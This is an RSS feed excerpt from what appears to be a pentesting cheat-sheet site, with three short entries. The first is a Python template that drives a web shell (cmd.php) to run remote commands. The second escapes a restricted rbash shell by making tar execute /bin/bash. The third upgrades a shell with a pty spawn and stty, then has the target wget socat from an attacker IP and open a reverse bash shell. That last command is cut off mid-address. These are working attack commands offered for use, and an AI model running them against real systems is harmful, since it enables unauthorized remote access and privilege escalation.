channel.title: Shell on TLDRBins
channel.description: Recent content in Shell on TLDRBins

item.title: Forward Shell
item.description: Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = "shell> " def default(self, args): response = requests.get("http://example.com/cmd.php", params = {"cmd": args}, proxies={"http":"http://127.0.0.1:8080"}) print(response.text) term = Term() term.cmdloop()

item.title: rbash
item.description: Abuse #1: tar to rbash Escape # Before enter rbash echo $PATH # Enter rbash su <USER> - # rbash escape using tar tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash # Paste the above $PATH (e.g.) export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

item.title: Upgrade Shell
item.description: Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c 'import pty; pty.spawn("/bin/bash")' # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.
